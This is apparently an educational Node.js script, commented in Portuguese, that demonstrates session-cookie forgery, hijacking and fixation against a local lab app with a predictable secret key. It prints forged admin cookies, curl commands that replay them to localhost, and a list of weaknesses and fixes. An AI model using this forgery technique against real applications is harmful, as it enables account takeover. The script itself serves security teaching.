#!/usr/bin/env node

/**
 * Demonstração Prática de Session Cookie Decoding
 * Este script demonstra as vulnerabilidades de session management
 */

const { decodeSessionCookie, createFakeSessionCookie, SECRET_KEY } = require('./session-decoder.js');

console.log('🎯 Demonstração de Vulnerabilidades de Session Cookie\n');

// 1. Criar diferentes tipos de session cookies
console.log('1️⃣ CRIANDO COOKIES DE DEMONSTRAÇÃO');
console.log('=====================================\n');

const adminSession = {
    user: {
        id: 1,
        username: 'admin',
        password: 'admin123',
        role: 'admin'
    }
};

const userSession = {
    user: {
        id: 2,
        username: 'user1',
        password: 'password',
        role: 'user'
    }
};

const maliciousSession = {
    user: {
        id: 999,
        username: 'hacker',
        password: 'pwned',
        role: 'admin'
    }
};

// Criar cookies
const adminCookie = createFakeSessionCookie(adminSession, SECRET_KEY);
const userCookie = createFakeSessionCookie(userSession, SECRET_KEY);
const hackCookie = createFakeSessionCookie(maliciousSession, SECRET_KEY);

console.log('Admin Cookie:', adminCookie);
console.log('User Cookie:', userCookie);
console.log('Malicious Cookie:', hackCookie);

// 2. Demonstrar decodificação
console.log('\n2️⃣ DECODIFICANDO COOKIES');
console.log('==========================\n');

const cookies = [
    { name: 'Admin', cookie: adminCookie },
    { name: 'User', cookie: userCookie },
    { name: 'Malicious', cookie: hackCookie }
];

cookies.forEach(({ name, cookie }) => {
    console.log(`--- ${name} Session ---`);
    const decoded = decodeSessionCookie(cookie, SECRET_KEY);
    if (decoded) {
        console.log('✅ Decodificado com sucesso:');
        console.log(JSON.stringify(decoded, null, 2));
    } else {
        console.log('❌ Falha na decodificação');
    }
    console.log();
});

// 3. Demonstrar Session Hijacking
console.log('3️⃣ DEMONSTRAÇÃO DE SESSION HIJACKING');
console.log('=====================================\n');

console.log('Cenário: Atacante intercepta cookie de admin e cria versão maliciosa\n');

// Simular interceptação
console.log('🔍 Cookie interceptado:', adminCookie.substring(0, 50) + '...');

// Modificar dados da sessão
const hijackedSession = {
    ...adminSession,
    user: {
        ...adminSession.user,
        username: 'admin_hijacked',
        injected: true,
        backdoor: '/bin/sh'
    }
};

const hijackedCookie = createFakeSessionCookie(hijackedSession, SECRET_KEY);
console.log('🎭 Cookie modificado criado:', hijackedCookie.substring(0, 50) + '...');

// Decodificar para mostrar modificação
const hijackedData = decodeSessionCookie(hijackedCookie, SECRET_KEY);
console.log('📋 Dados modificados:');
console.log(JSON.stringify(hijackedData, null, 2));

// 4. Demonstrar Session Fixation
console.log('\n4️⃣ DEMONSTRAÇÃO DE SESSION FIXATION');
console.log('====================================\n');

// Criar sessão pré-definida para fixation
const fixedSession = {
    user: {
        id: 1,
        username: 'admin',
        role: 'admin',
        fixed: true,
        timestamp: new Date().toISOString()
    }
};

const fixedCookie = createFakeSessionCookie(fixedSession, SECRET_KEY);
console.log('🔗 Cookie fixado criado:', fixedCookie);
console.log('💡 Atacante pode forçar a vítima a usar este cookie específico');

// 5. Análise de Segurança
console.log('\n5️⃣ ANÁLISE DE VULNERABILIDADES');
console.log('===============================\n');

console.log('🚨 PROBLEMAS IDENTIFICADOS:');
console.log('- Chave secreta previsível:', SECRET_KEY);
console.log('- Dados sensíveis armazenados no cookie (senhas)');
console.log('- Possibilidade de Session Hijacking');
console.log('- Possibilidade de Session Fixation');
console.log('- Falta de validação de integridade');
console.log('- Cookies não HTTPOnly/Secure');

console.log('\n🛡️ MEDIDAS CORRETIVAS:');
console.log('- Usar chave secreta criptograficamente forte');
console.log('- Armazenar apenas ID de sessão no cookie');
console.log('- Implementar rotação de session ID');
console.log('- Usar flags HTTPOnly e Secure');
console.log('- Implementar timeout de sessão');
console.log('- Validar origem das requisições');

console.log('\n6️⃣ COMANDOS PARA TESTE MANUAL');
console.log('==============================\n');

console.log('# Testar cookie admin:');
console.log(`curl -H "Cookie: connect.sid=${adminCookie}" http://localhost:3000/debug`);
console.log();

console.log('# Testar cookie malicioso:');
console.log(`curl -H "Cookie: connect.sid=${hackCookie}" http://localhost:3000/debug`);
console.log();

console.log('# Decodificar manualmente:');
console.log(`node session-decoder.js "${adminCookie}"`);
console.log();

console.log('✅ Demonstração concluída!');